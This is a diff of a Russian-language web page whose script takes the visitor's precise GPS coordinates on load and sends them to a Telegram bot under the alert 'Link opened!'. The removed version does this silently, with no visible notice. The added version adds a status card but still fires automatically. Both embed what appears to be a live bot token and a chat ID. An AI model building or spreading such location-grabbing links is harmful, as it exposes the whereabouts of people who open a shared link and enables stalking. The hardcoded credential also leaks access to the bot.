@@ -1,41 +1,181 @@
-  <script>
-    console.log("Страница загрузилась");
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Отправка геолокации в Telegram</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 24px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        h1 {
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+        }
+        .status {
+            background: #e9ecef;
+            border-radius: 16px;
+            padding: 16px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 0.9rem;
+            text-align: left;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        button {
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:hover {
+            background: #006699;
+        }
+        .note {
+            font-size: 0.8rem;
+            color: #6c757d;
+            margin-top: 20px;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>📍 Геолокация → Telegram</h1>
+    <p>После разрешения на геолокацию координаты будут отправлены вашему боту.</p>
+    <div class="status" id="status">⏳ Ожидание запроса...</div>
+    <button id="sendBtn">📎 Отправить геолокацию вручную</button>
+    <div class="note">
+        ⚠️ <strong>Важно!</strong> Чтобы бот мог писать вам, вы должны <strong>первым написать боту</strong> команду <code>/start</code>.<br>
+        🔧 Замените <code>CHAT_ID</code> в коде на <strong>ваш личный Telegram ID</strong> (см. инструкцию ниже).
+    </div>
+</div>
 
-    function sendLocation() {
-      console.log("Запрос геолокации...");
+<script>
+    // ---------- НАСТРОЙКИ (ОБЯЗАТЕЛЬНО ИЗМЕНИТЕ!) ----------
+    const BOT_TOKEN = "8876131918:AAF_P-YrCuMJwt8tJVsVh5X_i6EVJ3mOvo0";   // ваш токен (уже правильный)
+    // ⚠️ ВНИМАНИЕ: замените число ниже на ваш личный Telegram ID (НЕ ID БОТА!)
+    // Как узнать свой ID: напишите боту любое сообщение, затем откройте в браузере:
+    // https://api.telegram.org/bot8876131918:AAF_P-YrCuMJwt8tJVsVh5X_i6EVJ3mOvo0/getUpdates
+    // Найдите поле "chat":{"id": ЗДЕСЬ_ВАШ_ID} – это число (положительное)
+    const CHAT_ID = 550519891;   // <--- ЗАМЕНИТЕ НА ВАШ РЕАЛЬНЫЙ ID (например, 12345678)
+    // -----------------------------------------------------
 
-      if (!navigator.geolocation) {
-        console.log("Геолокация не поддерживается");
-        return;
-      }
+    const statusDiv = document.getElementById('status');
 
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          console.log("Геолокация получена!", position.coords);
-
-            const token = "8876131918:AAF_P-YrCuMJwt8tJVsVh5X_i6EVJ3mOvo0";           // ← токен в кавычках
-          const chatId = 550519891;         // ← только число
-
-          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: `🔔 Ссылка открыта!\n\n` +
-                    `📍 Широта: ${position.coords.latitude}\n` +
-                    `📍 Долгота: ${position.coords.longitude}\n` +
-                    `🔍 Точность: ${Math.round(position.coords.accuracy)} м\n` +
-                    `🕒 ${new Date().toLocaleString('ru-RU')}`
-            })
-          })
-          .then(r => r.json())
-          .then(result => console.log("✅ Отправлено:", result))
-          .catch(err => console.error("❌ Ошибка:", err));
-        },
-        (error) => console.error("Ошибка геолокации:", error),
-        { enableHighAccuracy: true }
-      );
+    function logToScreen(message, isError = false) {
+        const p = document.createElement('div');
+        p.textContent = message;
+        p.style.color = isError ? '#dc3545' : '#28a745';
+        p.style.marginTop = '5px';
+        statusDiv.appendChild(p);
+        statusDiv.scrollTop = statusDiv.scrollHeight;
+        console.log(isError ? '❌' : '✅', message);
     }
 
-    window.onload = sendLocation;
-  </script>
+    function clearStatus() {
+        statusDiv.innerHTML = '';
+    }
+
+    async function sendLocationToTelegram(latitude, longitude, accuracy) {
+        const text = `🔔 Ссылка открыта!\n\n` +
+                     `📍 Широта: ${latitude}\n` +
+                     `📍 Долгота: ${longitude}\n` +
+                     `🔍 Точность: ${Math.round(accuracy)} м\n` +
+                     `🕒 ${new Date().toLocaleString('ru-RU')}`;
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json; charset=utf-8'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'   // опционально, но не обязательно
+                })
+            });
+
+            const result = await response.json();
+            if (result.ok) {
+                logToScreen(`✅ Сообщение успешно отправлено в Telegram!`);
+            } else {
+                logToScreen(`❌ Ошибка Telegram: ${result.description} (код ${result.error_code})`, true);
+                if (result.error_code === 403) {
+                    logToScreen(`💡 Совет: Убедитесь, что вы написали боту команду /start и chat_id правильный (ваш личный ID, а не ID бота)`, true);
+                }
+            }
+        } catch (err) {
+            logToScreen(`❌ Ошибка сети или запроса: ${err.message}`, true);
+        }
+    }
+
+    function getLocation() {
+        clearStatus();
+        logToScreen("🔍 Запрос геолокации...");
+        if (!navigator.geolocation) {
+            logToScreen("❌ Ваш браузер не поддерживает геолокацию", true);
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                const { latitude, longitude, accuracy } = position.coords;
+                logToScreen(`📍 Получены координаты: широта ${latitude}, долгота ${longitude}, точность ${Math.round(accuracy)} м`);
+                sendLocationToTelegram(latitude, longitude, accuracy);
+            },
+            (error) => {
+                let errorMsg = "";
+                switch (error.code) {
+                    case error.PERMISSION_DENIED: errorMsg = "Пользователь запретил доступ к геолокации."; break;
+                    case error.POSITION_UNAVAILABLE: errorMsg = "Информация о местоположении недоступна."; break;
+                    case error.TIMEOUT: errorMsg = "Время получения местоположения истекло."; break;
+                    default: errorMsg = "Неизвестная ошибка геолокации.";
+                }
+                logToScreen(`❌ Ошибка геолокации: ${errorMsg}`, true);
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    }
+
+    // Автоматический запрос при загрузке страницы
+    window.addEventListener('load', () => {
+        logToScreen("Страница загружена. Запрашиваем геолокацию...");
+        getLocation();
+    });
+
+    // Кнопка для ручного повторного запроса
+    document.getElementById('sendBtn').addEventListener('click', getLocation);
+</script>
+</body>
+</html>
